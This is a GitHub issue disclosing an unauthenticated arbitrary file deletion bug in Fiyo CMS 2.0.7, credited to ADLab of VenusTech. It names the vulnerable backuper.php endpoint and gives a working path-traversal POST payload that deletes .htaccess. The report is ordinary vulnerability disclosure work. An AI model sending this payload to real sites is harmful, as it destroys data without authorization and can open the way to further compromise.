## Description

[![@jgj212](https://avatars.githubusercontent.com/u/1484292?v=4&size=48)](/jgj212)[jgj212](https://github.com/jgj212)opened [on Apr 17, 2017](https://github.com/FiyoCMS/FiyoCMS/issues/2#issue-222088189)

I found that Fiyo CMS version 2.0.7 has a any file delete vulnerability that do not need login.

[![1](https://cloud.githubusercontent.com/assets/1484292/25083238/806d7102-2388-11e7-807c-94f73950a3b2.png)](https://cloud.githubusercontent.com/assets/1484292/25083238/806d7102-2388-11e7-807c-94f73950a3b2.png)

There is not any checking about the $\_POST['act'] $\_POST[file] , client can control these two input to cause any file deletion .

reproduce(this will delete .htaccess file):

Url: <http://localhost> /dapur/apps/app\_config/controller/backuper.php

POST: type=delete&act=db&file=../.htaccess

Referrer: <http://localhost>

Discoverer: ADLab of VenusTech.
